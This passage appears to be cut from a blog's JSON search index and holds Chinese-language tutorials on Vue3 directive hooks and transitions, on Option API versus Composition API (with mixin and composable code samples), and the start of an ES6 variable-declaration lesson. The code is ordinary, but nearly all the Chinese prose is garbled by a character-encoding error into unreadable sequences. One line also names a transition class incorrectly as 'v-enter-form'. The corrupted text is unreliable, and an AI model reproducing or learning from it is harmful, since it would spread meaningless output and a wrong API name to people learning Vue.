changeMsg, } }, } \u0026lt;/script\u0026gt; æ¼”ç¤º è‡ªå®šç¾©æŒ‡ä»¤ å…ˆçœ‹çœ‹ Vue2 è‡ªå®šç¾©æŒ‡ä»¤çš„é‰¤å­ï¼š\nbindï¼šç•¶æŒ‡ä»¤ç¹«çµåœ¨å°æ‡‰å…ƒç´ æ™‚è§¸ç™¼ï¼Œåªæœƒè§¸ç™¼ä¸€æ¬¡ã€‚ insertedï¼šç•¶å°æ‡‰å…ƒç´ è¢«æ’å…¥åˆ° DOM çš„çˆ¶å…ƒç´ æ™‚è§¸ç™¼ã€‚ updateï¼šç•¶å…ƒç´ æ›´æ–°æ™‚ï¼Œé€™å€‹é‰¤å­æœƒè¢«è§¸ç™¼ï¼ˆæ­¤æ™‚å…ƒç´ çš„å¾Œä»£å…ƒç´ é‚„æ²’æœ‰è§¸ç™¼æ›´æ–°ï¼‰ã€‚ componentUpdatedï¼šç•¶æ•´å€‹å…ƒä»¶ï¼ˆåŒ…æ‹¬å­å…ƒä»¶ï¼‰å®Œæˆæ›´æ–°å¾Œï¼Œé€™å€‹é‰¤å­è§¸ç™¼ã€‚ unbindï¼šç•¶æŒ‡ä»¤è¢«å¾å…ƒç´ ä¸Šç§»é™¤æ™‚ï¼Œé€™å€‹é‰¤å­æœƒè¢«è§¸ç™¼ï¼Œä¹Ÿåªè§¸ç™¼ä¸€æ¬¡ã€‚ åœ¨ Vue3 ä¸­ï¼Œå®˜æ–¹ç‚ºäº†æ›´æœ‰åŠ©æ–¼ç¨‹å¼ç¢¼çš„å¯è®€æ€§å’Œé¢¨æ ¼çµ±ä¸€ï¼ŒæŠŠè‡ªå®šç¾©æŒ‡ä»¤çš„é‰¤å­åç¨±æ”¹çš„æ›´åƒæ˜¯å…ƒä»¶ç”Ÿå‘½é€±æœŸï¼Œå„˜ç®¡ä»–å€‘æ˜¯å…©å›äº‹ï¼š\nbind =\u0026gt; beforeMountã€‚ inserted =\u0026gt; mountedã€‚ beforeUpdateï¼šæ–°çš„é‰¤å­ï¼Œæœƒåœ¨å…ƒç´ è‡ªèº«æ›´æ–°å‰è§¸ç™¼ã€‚ update =\u0026gt; ç§»é™¤ï¼ componentUpdated =\u0026gt; updatedã€‚ beforeUnmountï¼šæ–°çš„é‰¤å­ï¼Œç•¶å…ƒç´ è‡ªèº«è¢«è§£é™¤å®‰è£å‰è§¸ç™¼ã€‚ unbind =\u0026gt; unmountedã€‚ éæ¸¡å‹•ç•« é€™å€‹æ²’æœ‰ä»€éº¼å¤§çš„æ”¹å‹•ï¼Œåªæ˜¯ä¿®æ”¹äº†å…©å€‹ class åå­—ï¼Œæ­£æ˜¯å› ç‚ºæ²’æœ‰ä»€éº¼å¤§çš„æ”¹å‹•ï¼Œå°è‡´æˆ‘æ›¾ç¶“åœ¨é€™è£¡æ ½äº†å¤§è·Ÿé ­ï¼Œå¯«å®Œäº†æ€éº¼éƒ½ä¸å°ï¼Œå¾Œä¾†æŸ¥å®˜ç¶²æ‰çŸ¥é“ã€‚\nä»¥ä¸‹æ˜¯ç›´æ¥å¼•ç”¨å®˜ç¶²çš„åŸæ–‡ï¼š\nv-enter-fromï¼šå®šç¾©é€²å…¥éæ¸¡çš„é–‹å§‹ç‹€æ…‹ã€‚åœ¨å…ƒç´ è¢«æ’å…¥ä¹‹å‰ç”Ÿæ•ˆï¼Œåœ¨å…ƒç´ è¢«æ’å…¥ä¹‹å¾Œçš„ä¸‹ä¸€å¹€ç§»é™¤ã€‚ v-enter-activeï¼šå®šç¾©é€²å…¥éæ¸¡ç”Ÿæ•ˆæ™‚çš„ç‹€æ…‹ã€‚åœ¨æ•´å€‹é€²å…¥éæ¸¡çš„éšæ®µä¸­æ‡‰ç”¨ï¼Œåœ¨å…ƒç´ è¢«æ’å…¥ä¹‹å‰ç”Ÿæ•ˆï¼Œåœ¨éæ¸¡/å‹•ç•«å®Œæˆä¹‹å¾Œç§»é™¤ã€‚é€™å€‹é¡å¯ä»¥è¢«ç”¨ä¾†å®šç¾©é€²å…¥éæ¸¡çš„éç¨‹æ™‚é–“ï¼Œå»¶é²å’Œæ›²ç·šå‡½å¼ã€‚ v-enter-toï¼šå®šç¾©é€²å…¥éæ¸¡çš„çµæŸç‹€æ…‹ã€‚åœ¨å…ƒç´ è¢«æ’å…¥ä¹‹å¾Œä¸‹ä¸€å¹€ç”Ÿæ•ˆ (èˆ‡æ­¤åŒæ™‚ v-enter-from è¢«ç§»é™¤)ï¼Œåœ¨éæ¸¡/å‹•ç•«å®Œæˆä¹‹å¾Œç§»é™¤ã€‚ v-leave-fromï¼šå®šç¾©é›¢é–‹éæ¸¡çš„é–‹å§‹ç‹€æ…‹ã€‚åœ¨é›¢é–‹éæ¸¡è¢«è§¸ç™¼æ™‚ç«‹åˆ»ç”Ÿæ•ˆï¼Œä¸‹ä¸€å¹€è¢«ç§»é™¤ã€‚ v-leave-activeï¼šå®šç¾©é›¢é–‹éæ¸¡ç”Ÿæ•ˆæ™‚çš„ç‹€æ…‹ã€‚åœ¨æ•´å€‹é›¢é–‹éæ¸¡çš„éšæ®µä¸­æ‡‰ç”¨ï¼Œåœ¨é›¢é–‹éæ¸¡è¢«è§¸ç™¼æ™‚ç«‹åˆ»ç”Ÿæ•ˆï¼Œåœ¨éæ¸¡/å‹•ç•«å®Œæˆä¹‹å¾Œç§»é™¤ã€‚é€™å€‹é¡å¯ä»¥è¢«ç”¨ä¾†å®šç¾©é›¢é–‹éæ¸¡çš„éç¨‹æ™‚é–“ï¼Œå»¶é²å’Œæ›²ç·šå‡½å¼ã€‚ v-leave-toï¼šé›¢é–‹éæ¸¡çš„çµæŸç‹€æ…‹ã€‚åœ¨é›¢é–‹éæ¸¡è¢«è§¸ç™¼ä¹‹å¾Œä¸‹ä¸€å¹€ç”Ÿæ•ˆ (èˆ‡æ­¤åŒæ™‚ v-leave-from è¢«åˆªé™¤)ï¼Œåœ¨éæ¸¡/å‹•ç•«å®Œæˆä¹‹å¾Œç§»é™¤ã€‚ ç‰¹åˆ¥æ³¨æ„çš„æ˜¯ï¼š\nv-enter æ”¹æˆäº† v-enter-form\nv-leave æ”¹æˆäº† v-leave-from\nå…¶ä»–å°çŸ¥è­˜ Vue3 ç§»é™¤äº† filterã€‚ ç²å–å…ƒä»¶å¯¦ä¾‹çš„æ–¹æ³• getCurrentInstance()ï¼š\né€™å€‹æ–¹æ³•å¯ä»¥ç²å–åˆ°ç•¶å‰å…ƒä»¶çš„å¯¦ä¾‹ï¼Œç›¸ç•¶æ–¼ Vue2 ä¸­çš„ thisï¼Œä½†æ˜¯å®ƒåªåœ¨==é–‹ç™¼ç’°å¢ƒ==èµ·æ•ˆæœï¼Œæ‰“åŒ…ä»¥å¾Œæœƒå ±éŒ¯ï¼Œæ‰€ä»¥å¤§å®¶ä¸è¦ä¾è³´ getCurrentInstance æ–¹æ³•å»ç²å–å…ƒä»¶å¯¦ä¾‹ä¾†å®Œæˆä¸€äº›ä¸»è¦åŠŸèƒ½ã€‚\næ›´è©³ç´°çš„å¯ä»¥æª¢è¦–ä¸‹é¢é€™ç¯‡æ–‡ç« ï¼š\né—œæ–¼Vue3ç²å–ç•¶å‰å…ƒä»¶ä¾‹é …çš„ getCurrentInstance æ–¹æ³•çš„è£œå…… æœ€å¾Œï¼Œç•¢ç«Ÿæ˜¯å€‹äººç¸½çµï¼Œé›£å…æœƒå‡ºç¾ç´•æ¼å’ŒéŒ¯èª¤ï¼ŒæœŸå¾…å„è·¯å¤§ç¥çš„è£œå……å’Œç³¾æ­£ã€‚\nåƒè€ƒ åƒè€ƒç¶²ç«™ Vue3å®˜æ–¹ä¸­æ–‡æ–‡ä»¶ Vue3.0å…‰é€Ÿä¸Šæ‰‹ Volar - vueçµ‚æ¥µé–‹ç™¼ç¥å™¨ï¼ Vue3.0 æ–°ç‰¹æ€§ä»¥åŠä½¿ç”¨ç¶“é©—ç¸½çµ å°šçŸ½è°·2021æœ€æ–°Vue.JSæ•™ç¨‹å¿«é€Ÿå…¥é–€åˆ°å°ˆæ¡ˆå¯¦æˆ°ï¼ˆVue3/VueJSæŠ€è¡“è©³è§£ï¼‰ é‚£å€‹å¿™äº†ä¸€å¤œçš„Vue3å‹•ç•«å¾ˆå¥½ï¼Œå°±æ˜¯å¤ªçŸ­äº† ","date":"2022-08-11T00:00:00Z","image":"https://live.staticflickr.com/65535/52277578302_d4a3e0c4aa_o.png","permalink":"https://wayneblog.ga/2022-08-11/vue3-quick-start/","title":"Vue3.0 å¿«é€Ÿå…¥é–€ï¼Œçœ‹å®ŒåŸºæœ¬å¯ä»¥ä¸Šæ‰‹æé–‹ç™¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå›é¡§ Option API åœ¨äº†è§£ Composition Api ä¹‹å‰ï¼Œé¦–å…ˆå›é¡§ä¸‹æˆ‘å€‘ä½¿ç”¨ Option Api é‡åˆ°çš„å•é¡Œï¼Œæˆ‘å€‘åœ¨ Vue2 ä¸­å¸¸å¸¸æœƒéœ€è¦åœ¨ç‰¹å®šçš„å€åŸŸï¼ˆdataã€methodsã€watchã€computed\u0026hellip;ï¼‰ç·¨å¯«è² è²¬ç›¸åŒåŠŸèƒ½çš„ä»£ç¢¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;val\u0026#34; @keyup.enter=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt;{{todo.title}}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data(){ return{ val:\u0026#39;\u0026#39;, todos:[ {id:0, title:\u0026#39;åƒé¥­\u0026#39;, done:false}, {id:1, title:\u0026#39;ç¡è§‰\u0026#39;, done:false}, {id:2, title:\u0026#39;lsp\u0026#39;, done:false}, ] } }, methods:{ addTodo(){ this.todos.push({ id:this.todos.length, title:this.val, done:false }) this.val = \u0026#39;\u0026#39; } } } \u0026lt;/script\u0026gt; Option Api çš„ç¼ºé™· åè¦†æ©«è·³ éš¨è‘—æ¥­å‹™è¤‡é›œåº¦è¶Šä¾†è¶Šé«˜ï¼Œä»£ç¢¼é‡æœƒä¸æ–·çš„åŠ å¤§ï¼›ç”±æ–¼ç›¸é—œæ¥­å‹™çš„ä»£ç¢¼éœ€è¦éµå¾ª option çš„é…ç½®å¯«åˆ°ç‰¹å®šçš„å€åŸŸï¼Œå°è‡´å¾ŒçºŒç¶­è­·éå¸¸çš„è¤‡é›œï¼Œä»£ç¢¼å¯è¤‡ç”¨æ€§ä¹Ÿä¸é«˜ã€‚\nç›¸ä¿¡å¤§éƒ¨åˆ†åŒå­¸éƒ½ç¶­è­·éè¶…é200è¡Œçš„ .vue çµ„ä»¶ï¼Œæ–°å¢æˆ–è€…ä¿®æ”¹ä¸€å€‹éœ€æ±‚ï¼Œå°±éœ€è¦åˆ†åˆ¥åœ¨ dataã€methodsã€computed è£¡ä¿®æ”¹ï¼Œæ»¾å‹•æ¢åå¤ä¸Šä¸‹ç§»å‹•ï¼Œæˆ‘ç¨±ä¹‹ç‚ºã€åå¤æ©«è·³ã€ï¼Œæ¯”å¦‚æˆ‘å€‘ç°¡å–®çš„åŠ å€‹æ‹è…¦é–€çš„éœ€æ±‚åŠ å€‹ç´¯åŠ å™¨ï¼Œé€™ç¨®å¯«ä»£ç¢¼ä¸Šä¸‹åå¤æ©«æ¢çš„æ„Ÿè¦ºï¼Œç›¸ä¿¡å¤§å®¶éƒ½æ‡‚çš„ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h1 @click=\u0026#34;add\u0026#34;\u0026gt;LSP {{count}}å· double is{{double}}\u0026lt;/h1\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;val\u0026#34; @keyup.enter=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt;{{todo.title}}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import Counter from \u0026#39;./counter\u0026#39; export default { mixins:[Counter], data(){ return{ count:1, val:\u0026#39;\u0026#39;, todos:[ {id:0, title:\u0026#39;åƒé¥­\u0026#39;, done:false}, {id:1, title:\u0026#39;ç¡è§‰\u0026#39;, done:false}, {id:2, title:\u0026#39;lsp\u0026#39;, done:false}, ] } }, computed: { double() { return this.count * 2 } }, methods:{ addTodo(){ this.todos.push({ id:this.todos.length, title:this.val, done:false }) this.val = \u0026#39;\u0026#39; }, add(){ this.count++ } } } \u0026lt;/script\u0026gt; mixin å’Œ this åè¦†æ©«è·³çš„æœ¬è³ªï¼Œåœ¨æ–¼åŠŸèƒ½çš„åˆ†å¡Šçµ„ç¹”ï¼Œä»¥åŠä»£ç¢¼é‡å¤ªå¤§äº†ï¼Œå¦‚æœæˆ‘å€‘èƒ½æŠŠä»£ç¢¼æ§åˆ¶åœ¨ä¸€å±ï¼Œè‡ªç„¶å°±è§£æ±ºäº†ï¼Œvue2 è£¡çš„è§£æ±ºæ–¹æ¡ˆï¼Œæ˜¯ä½¿ç”¨ mixin ä¾†æ··åˆ, æˆ‘å€‘æŠ½é›¢ä¸€å€‹ counter.jsï¼š counter.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 export default { data() { return { count:1 } }, computed: { double() { return this.count * 2 } }, methods:{ add(){ this.count++ } } } App.vue 1 2 3 4 5 6 7 8 import Counter from \u0026#39;./counter\u0026#39; export default { mixins:[Counter], data(){ ... }, ... } é€™æ¨£ç¢ºå¯¦æ‹†åˆ†äº†ä»£ç¢¼ï¼Œä½†æ˜¯æœ‰ä¸€å€‹å¾ˆåš´é‡çš„å•é¡Œï¼Œå°±æ˜¯ä¸æ‰“é–‹ counter.jsï¼ŒApp.vue è£¡çš„ this ä¸Šï¼Œcountã€addé€™äº›å±¬æ€§ï¼Œæ˜¯å®Œå…¨ä¸çŸ¥é“å¾å“ªä¾†çš„ï¼Œä½ ä¸çŸ¥é“æ˜¯ mixinï¼Œé‚„æ˜¯å…¨å±€ installï¼Œé‚„æ˜¯ Vue.prototype.count è¨­ç½®çš„ï¼Œæ•¸æ“šä¾†æºå®Œå…¨æ¨¡ç³Šï¼Œèª¿è©¦çˆ½æ­»ä½ ï¼Œé€™ä¹Ÿæ˜¯ option çš„ä¸€å€‹å¤§å•é¡Œï¼Œthis æ˜¯å€‹é»‘ç›’ï¼Œtemplate è£¡å¯«çš„ count å’Œ doubleï¼Œå®Œå…¨ä¸çŸ¥é“å¾å“ªä¾†çš„ã€‚\nå¦‚æœæœ‰å…©å€‹ mixinï¼Œå°±æ›´æœ‰æ„æ€äº†ï¼Œæ¯”å¦‚æˆ‘å€‘åˆæœ‰ä¸€å€‹éœ€æ±‚ï¼Œå¯¦æ™‚é¡¯ç¤ºé¼ æ¨™çš„åæ¨™ä½ç½® xï¼Œä¸¦ä¸”æœ‰ä¸€å€‹ä¹˜ä»¥ 2 çš„è¨ˆç®—å±¬æ€§æ¹Šå·§ä¹Ÿå« doubleï¼Œå†æ•´ä¸€å€‹ mixinï¼š\nuseMouse.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 export default { data() { return { x:0 } }, methods:{ update(e){ this.x = e.pageX } }, computed:{ double(){ return this.x*2 } }, mounted(){ window.addEventListener(\u0026#39;mousemove\u0026#39;, this.update) }, destroyed(){ window.removeEventListener(\u0026#39;mousemove\u0026#39;, this.update) } } é€™æ˜¯ä¸€å€‹ç¨ç«‹ç¶­è­·çš„ mixinï¼Œå¯èƒ½åœ¨ N å€‹åœ°æ–¹ç”¨åˆ°ï¼Œä»–æ ¹æœ¬ä¸çŸ¥é“æœƒä¸æœƒæœ‰äººå’Œä»–è¡çªï¼Œç„¶å¾Œç”¨ä¸€ä¸‹ï¼š\nApp.vue 1 2 3 4 5 6 import Counter from \u0026#39;./counter\u0026#39; import Mouse from \u0026#39;./mouse\u0026#39; export default { mixins:[Counter,Mouse], ...... } å…©å€‹ mixin è£¡éƒ½æœ‰ double é€™å€‹æ•¸ï¼Œå°·å°¬ï¼Œçœ‹æ•ˆæœï¼Œlsp çš„ count è¢«è¦†è“‹äº†å¾ˆå°·å°¬ï¼Œè€Œä¸”åœ¨ App.vue é€™è£¡ï¼Œä½ å®Œå…¨ä¸çŸ¥é“é€™å€‹ double åˆ°åº•æ˜¯å“ªå€‹ï¼Œèª¿è©¦å¾ˆç—›è‹¦ã€‚\nComposition Api composition å°±æ˜¯ç‚ºäº†è§£æ±ºé€™å€‹å•é¡Œå­˜åœ¨çš„ï¼Œé€šéçµ„åˆçš„æ–¹å¼ï¼ŒæŠŠé›¶æ•£åœ¨å„å€‹ dataã€methods çš„ä»£ç¢¼é‡æ–°çµ„åˆï¼Œä¸€å€‹åŠŸèƒ½çš„ä»£ç¢¼éƒ½æ”¾åœ¨ä¸€èµ·ç¶­è­·ï¼Œä¸¦ä¸”é€™äº›ä»£ç¢¼å¯ä»¥å–®ç¨æ‹†åˆ†æˆå‡½æ•¸ï¼Œé¡¯ç„¶æˆ‘å€‘å¯ä»¥æ›´åŠ å„ªé›…çš„çµ„ç¹”æˆ‘å€‘çš„ä»£ç¢¼ï¼Œå‡½æ•¸ã€‚è®“ç›¸é—œåŠŸèƒ½çš„ä»£ç¢¼æ›´åŠ æœ‰åºçš„çµ„ç¹”åœ¨ä¸€èµ·ã€‚\næˆ‘å€‘ç”¨vue3æ¼”ç¤ºä¸€ä¸‹åŠŸèƒ½ï¼Œå…·é«”apiå°±ä¸è§£é‡‹äº†ç›´æ¥vue3æ–‡æª”æèµ·å°±å¯ä»¥ï¼š\nApp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;val\u0026#34; @keyup.enter=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt;{{todo.title}}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { reactive, ref, toRefs } from \u0026#39;vue\u0026#39; export default { setup(){ let val = ref(\u0026#39;\u0026#39;) let todos = reactive([ { id:0, title:\u0026#39;åƒé¥­\u0026#39;, done:false }, { id:1, title:\u0026#39;ç¡è§‰\u0026#39;, done:false }, { id:2, title:\u0026#39;lsp\u0026#39;, done:false }, ]) function addTodo(){ todos.push({ id: todos.length, title: val.value, done: false }) val.value = \u0026#39;\u0026#39; } return {val, todos, addTodo} } } \u0026lt;/script\u0026gt; åˆ©ç”¨å‡½æ•¸æˆ‘å€‘å¯ä»¥æŠŠåŠŸèƒ½å®Œæ•´ç¨ç«‹çš„æ‹†åˆ†æˆæ¨¡å¡Šæˆ–è€…å‡½æ•¸ï¼Œæ–¹ä¾¿çµ„ç¹”ä»£ç¢¼ï¼Œä¸¦ä¸”è§£æ±ºäº† mixin æ··äº‚çš„å•é¡Œã€‚\næ¯”å¦‚æˆ‘å€‘çš„ç´¯åŠ å™¨ï¼ŒæŠ½é›¢ä¸€å€‹counter.jsï¼š\ncounter.js 1 2 3 4 5 6 7 8 9 10 import { ref, computed } from \u0026#39;vue\u0026#39; export default function useCounter(){ let count = ref(1) function add(){ count.value++ } let double = computed(()=\u0026gt;count.value*2) return { count, double, add } } ç›´æ¥ä½¿ç”¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 import { reactive, ref, toRefs } from \u0026#39;vue\u0026#39; + import useCounter from \u0026#39;./counter\u0026#39; export default { setup(){ let val = ref(\u0026#39;\u0026#39;) ... + let { count,double,add } = useCounter() return { val, todos, addTodo, + count, double, add } } } å†ä¾†ä¸€å€‹é¼ æ¨™ä½ç½®ä¹Ÿä¸åœ¨è©±ä¸‹ï¼Œè€Œä¸”å¯ä»¥å¾ˆå¥½åœ°åˆ©ç”¨è§£æ§‹è³¦å€¼çš„åˆ¥åï¼Œè§£æ±º mixin çš„å‘½åè¡çªå•é¡Œï¼š\nuseMouse.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import { ref, onMounted, onUnmounted, computed } from \u0026#39;vue\u0026#39; export default function useMouse(){ let x = ref(0) function update(e){ x.value = e.pageX } let double = computed(()=\u0026gt;x.value*2) onMounted(()=\u0026gt;{ window.addEventListener(\u0026#39;mousemove\u0026#39;, update) }) onUnmounted(()=\u0026gt;{ window.removeEventListener(\u0026#39;mousemove\u0026#39;, update) }) return { x, double } } æ¨¡æ¿è£¡ç›´æ¥ç”¨ doubelXï¼š\n1 2 3 4 5 6 7 let { count, double, add } = useCounter() let { x, double:doubleX } = useMouse() return { val, todos, addTodo, count, double, add, x, doubleX } script setup ä¸éæœ‰çš„åŒå­¸å¯èƒ½ï¼Œé‚„æœ‰ä¸€å€‹å°å°çš„åæ§½ï¼Œé‚£å°±æ˜¯ setup å‡½æ•¸æœ€å¾Œçš„ return ä¹Ÿæ˜¯é›†ä¸­çš„ï¼Œå¦‚æœè¡Œæ•¸å¤ªå¤šï¼Œä¸€æ¨£æœƒæ©«æ¢ä¸€ä¸‹ä¸‹ã€‚\né€™å€‹å¥½è§£æ±ºï¼Œå› ç‚ºæœ¬èº«æˆ‘å€‘å¯ä»¥æŠŠ todos ä¹ŸæŠ½é›¢æˆå‡½æ•¸ï¼Œé€™æ¨£ setup å°±å…¨éƒ¨æ˜¯æ•¸æ“šçš„ä¾†æºï¼Œéå¸¸ç²¾ç°¡çµ²æ»‘ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import useCounter from \u0026#39;./counter\u0026#39; import useMouse from \u0026#39;./mouse\u0026#39; import useTodo from \u0026#39;./todos\u0026#39; export default { setup(){ let { val, todos, addTodo } = useTodo() let { count, double, add } = useCounter() let { x, double:doubleX } = useMouse() return { val, todos, addTodo, count, double, add, x, doubleX } } } æ˜¯ä¸æ˜¯è³Šçˆ½å‘¢ï¼Œå¦‚æœæœ‰äº›åŒå­¸å°±æ˜¯ä¸æƒ³å•¥éƒ½æŠ½é›¢ï¼Œé‚„æ˜¯è¦ºå¾—çµ±ä¸€ return å¾ˆéº»ç…©ï¼Œ æˆ‘å€‘å¯ä»¥ä½¿ç”¨ vue3 çš„ setup script åŠŸèƒ½ï¼ŒæŠŠ setup é€™å€‹é…ç½®ä¹Ÿå„ªåŒ–æ‰ä¸€å€‹åŠŸèƒ½ export ä¸€æ¬¡ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script setup\u0026gt; import useCounter from \u0026#39;./counter\u0026#39; import useMouse from \u0026#39;./mouse\u0026#39; import useTodo from \u0026#39;./todos\u0026#39; let { val, todos, addTodo } = useTodo() export { val, todos, addTodo } let { count, double, add } = useCounter() export { count, double, add } let { x, double:doubleX } = useMouse() export { x, doubleX } \u0026lt;/script\u0026gt; å…·é«”çœ‹é€™è£¡\n","date":"2022-08-11T00:00:00Z","image":"https://live.staticflickr.com/65535/52277524312_b6dc5e213c_o.png","permalink":"https://wayneblog.ga/2022-08-11/option-api-vs-composition-api/","title":"åœ–è§£ Option API vs Composition API"},{"content":" ã€å°šç¡…è°·ã€‘ES6æ•™ç¨‹ - æ¶µç›– ES6~ES11\nçµ¦é€²å…¥ Vue.js å‰çš„ ES6 å¿…å‚™çŸ¥è­˜\nè¶…çº§å®ç”¨çš„ ES6 ç‰¹æ€§\nã€è©³ç´° MDN æ–‡ä»¶ã€‘\nECMAScript ES æ˜¯ ECMAScript çš„ç°¡ç¨±ï¼ŒECMAScript æ˜¯è…³æœ¬èªè¨€çš„è¦ç¯„ã€‚è€Œæˆ‘å€‘æ‰€ä½¿ç”¨çš„ JavaScript æ˜¯ ECMAScript çš„ä¸€ç¨®å¯¦ç¾ã€‚ ç°¡è¨€ä¹‹ï¼šECMAåšå‡ºè¦ç¯„ï¼Œå„ç€è¦½å™¨ä¾ç…§è¦ç¯„åšå‡ºå¯¦ç¾ï¼Œå› è€Œä¸åŒç€è¦½å™¨æœƒæœ‰å…¼å®¹æ€§ä¸åŒçš„æƒ…æ³ã€‚ ES6 æ˜¯ ES çš„ç¶“å…¸ç‰ˆæœ¬ï¼Œæ˜¯å‰ç«¯å·¥ç¨‹å¸«å´—ä½çš„é«˜é »éœ€æ±‚ï¼Œæ˜¯å‰ç«¯é–‹ç™¼å·¥ç¨‹å¸«æ±‚è·çš„å¿…å‚™æŠ€èƒ½ã€‚ ç¾éšæ®µå‰ç«¯è¡Œæ¥­ç™¼å±•è¿…çŒ›ï¼Œå‰ç«¯æŠ€è¡“ä¹Ÿåœ¨é«˜é€Ÿè¿­ä»£ï¼Œ ES6-ES11 è¦èŒƒå¢åŠ äº†å¾ˆå¤š JavaScript æ–°ç‰¹æ€§ã€‚ ES æ–°ç‰¹æ€§å·²ç¶“æˆç‚ºå‰ç«¯æŠ€è¡“ç™¼å±•çš„è¶¨å‹¢ï¼Œèªæ³•ç°¡æ½”ï¼ŒåŠŸèƒ½è±å¯Œï¼Œéƒ¨åˆ†ç‰¹æ€§é‚„æœ‰æ€§èƒ½æå‡ï¼Œå‰ç«¯é–‹ç™¼ä¸‰å¤§æ¡†æ¶ Vueã€Reactã€Angular éƒ½ç”¨åˆ°äº†å¤§é‡çš„æ–°ç‰¹æ€§ä»£ç¢¼ï¼Œæ¡†æ¶çš„å‡ç´šä¹Ÿåœ¨å‘è‘—æ–°ç‰¹æ€§èªæ³•é æ”ã€‚ var ã€ let èˆ‡ const var ã€ let èˆ‡ const åœ¨ Javascript éƒ½æ˜¯ç”¨ä¾†å®£å‘Šè®Šæ•¸çš„èªæ³•ï¼Œæœ€å¤§çš„å·®åˆ¥æ˜¯ä»–å€‘çš„scope(è®Šæ•¸æœ‰æ•ˆç¯„åœ)çš„ä¸åŒã€‚åˆ‡åˆ†varä½œç”¨ç¯„åœçš„æœ€å°å–®ä½ç‚º functionï¼Œè€Œ let èˆ‡ const çš„ä½œç”¨ç¯„åœæ˜¯ block ä¹Ÿå°±æ˜¯ä¿—ç¨±çš„å¤§æ‹¬è™Ÿï¼š{ } ä¾†åˆ‡åˆ†ã€‚ const æ‰€å®£å‘Šçš„è®Šæ•¸é‚„æœ‰å¦ä¸€å€‹ç‰¹æ€§æ˜¯ç„¡æ³•è¢«é‡æ–°è³¦å€¼ (re-assign)ã€‚ let ç‰¹æ€§ var å¯ä»¥é‡è¤‡è²æ˜ï¼Œä½† let ä¸èƒ½é‡è¤‡è²æ˜ã€‚ æ¼”ç¤ºï¼š 1 2 3 4 5 var testA = \u0026#34;AAA\u0026#34;; var testA = \u0026#34;BBB\u0026#34;; // ä¸æœƒå ±éŒ¯ let testB = \u0026#34;AAA\u0026#34;; let testB = \u0026#34;BBB\u0026#34;; // æœƒå ±éŒ¯ let ç‚ºå¡Šç´šä½œç”¨åŸŸ å¡Šç´šä½œç”¨åŸŸï¼šè®Šæ•¸åªåœ¨ä»£ç¢¼å¡Šè£¡é¢æœ‰æ•ˆ({ ... }ã€if elseã€whileã€for) åœ¨ ES5 ä¸­ï¼Œä½œç”¨åŸŸæœ‰ï¼šå…¨å±€ã€å‡½æ•¸ã€eval(åš´æ ¼æ¨¡å¼ä¸‹) æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 8 9 { var b = \u0026#34;BBB\u0026#34;; } console.log(b); // \u0026#34;BBB\u0026#34;ï¼Œå› ç‚º var éå¡Šç´šä½œç”¨åŸŸï¼Œæ‰€ä»¥è²æ˜æ™‚æœƒå¾€å¤–å±¤(å…¨å±€window)æ·»åŠ é€™å€‹å±¬æ€§ { let a = \u0026#34;AAA\u0026#34;; } console.log(a); // æœƒå ±éŒ¯ a is not defined ä¸å­˜åœ¨è®Šæ•¸æå‡ è®Šæ•¸æå‡ï¼šä»£ç¢¼åŸ·è¡Œå‰æœƒå…ˆé€²è¡Œè®Šæ•¸æœé›†ï¼Œvar è²æ˜çš„è®Šé‡åœ¨æœé›†æ™‚æœƒå…ˆå®šç¾©ä¸€å€‹ undefined çš„åˆå§‹å€¼ã€‚ æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 // åœ¨ a ç”¨ var è²æ˜å‰è¼¸å‡º console.log(a); // ä¸æœƒå ±éŒ¯ï¼Œæœƒè¼¸å‡º undefined var a = \u0026#34;AAA\u0026#34;; // åœ¨ b ç”¨ let è²æ˜å‰è¼¸å‡º console.log(b); // æœƒå ±éŒ¯ï¼ŒCannot access \u0026#39;b\u0026#39; before initialization let b = \u0026#34;BBB\u0026#34;; ä¸å½±éŸ¿ä½œç”¨åŸŸéˆ æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 { let school = 